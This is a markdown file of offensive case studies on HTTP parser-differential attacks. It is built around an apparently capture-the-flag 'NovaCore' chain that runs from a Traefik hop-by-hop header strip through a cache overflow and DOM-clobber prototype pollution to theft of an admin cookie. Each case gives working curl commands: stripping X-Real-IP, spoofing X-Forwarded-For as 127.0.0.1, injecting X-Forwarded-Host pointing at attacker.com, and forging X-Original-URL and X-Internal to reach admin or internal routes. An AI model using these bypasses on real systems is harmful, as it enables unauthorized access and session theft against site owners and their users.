# Case studies deep — the verified parser-differential chains

The verified chains — the NovaCore card + the canonical published patterns.

---

## Case A — the NovaCore chain — the verified card

```text
stack:   Traefik 2.10.4, Python, Flask, C
card:    knowledge/chains/htb-novacore-hopbyhop-cache-overflow-domclobber-polyglot-rce.json
mechanism: a Traefik hop-by-hop bypass → a cache-daemon strcpy overflow →
         a DOM-clobber prototype-pollution → a polyglot exfil
```

### The chain

```text
step 1 — the hop-by-hop bypass:
  a Traefik proxy adds X-Real-IP — the app reads it for a local-vs-remote
  trust check — naming X-Real-IP in the Connection header strips it —
  the app sees a request without the trusted header — a missing-header
  fallback treats it as local — the token_required check skipped — a
  restricted route reached.

step 2 — a cache-overflow:
  the custom cache daemon's strcpy overflows a fixed-size value — the
  write lands in the next entry's key — another user's record addressed —
  a cache-confusion reach.

step 3 — a DOM-clobber prototype-pollution:
  the site's own script's DOM lookups clobbered — the fetch redirected —
  the prototype polluted — the eval's value attacker-controlled — a
  stored-injection reach.

step 4 — a polyglot exfil:
  the admin's cookie exfiltrated through the same-site store — the flag
  read.
```

### The first confirming probe

```bash
# the card's first probe — a normal request then a stripped request
curl "$BASE/api/copy_signal_trade" -d 'data'   # a 401/403 — token required
curl "$BASE/api/copy_signal_trade" -d 'data' -H 'Connection: keep-alive, X-Real-IP'
#   a 200 — the strip worked → the token_required check bypassed
```

### The falsifier

```text
'both forms are rejected, so the trust check does not depend on that
header' — the header isn't the trust check's input → a different class.
```

## Case B — the X-Forwarded-Host injection — a stored-URL reach

```text
an app that builds absolute URLs from X-Forwarded-Host — a client-
supplied X-Forwarded-Host rewrites the app's links — the app's links/
scripts point to attacker.com — a stored-injection reach.
```

```bash
# the injection
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'
#   the app's links/scripts point to attacker.com → a stored injection
```

## Case C — the X-Original-URL rewrite — a path-rewrite

```text
an app that honors X-Original-URL — a client-supplied X-Original-URL
rewrites the path — the app serves a different route — a path-rewrite.
```

```bash
# the rewrite
curl "$BASE/page" -H 'X-Original-URL: /admin'
#   the app serves /admin under /page → a path-rewrite
```

## Case D — the X-Forwarded-For spoof — a local-IP forgery

```text
an app that reads X-Forwarded-For for a local-vs-remote check — a
client-supplied X-Forwarded-For: 127.0.0.1 → a local request → the
trust check bypassed.
```

```bash
# the spoof
curl "$BASE/api/admin" -H 'X-Forwarded-For: 127.0.0.1'
#   a 200 — the check passed → a local request → the trust check bypassed
```

## Case E — the X-Internal bypass — a flag-forgery

```text
an app that checks X-Internal for an internal-route check — a client-
supplied X-Internal: true → the check passes → an internal route reached.
```

```bash
# the bypass
curl "$BASE/internal" -H 'X-Internal: true'
#   a 200 — the check passed → the internal route reached
```

## Case F — the multi-proxy differential — a chained normalization

```text
a multi-proxy chain — a header each strips differently — a chained
normalization boundary — a per-layer differential.
```

```bash
# the differential
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'
#   the edge strips it; the origin doesn't → a chained differential
```

## The cross-case pattern

```text
every parser-differential case is a front-end/back-end parse-mismatch:
1. a front-end (a proxy, a gateway, a WAF) parses the request one way
2. a back-end (the app) parses it another
3. the same bytes, two different interpretations — the disagreement is
   the vulnerability
4. the app's check reads a different value than the front-end's — a
   trust check, a route check, a normalization — a differential
```

## The per-case falsifier — when the differential is dead

```text
a proxy that doesn't strip its own header → the hop-by-hop bypass fails
a proxy that strips a client-supplied header → the client-supplied
  bypass fails → the hop-by-hop bypass is the vector
a proxy that verifies the header it added → the client-supplied bypass
  fails → the hop-by-hop bypass is the vector
a non-header check → a different class
the proxy and the app normalize the same way → no confusion
```
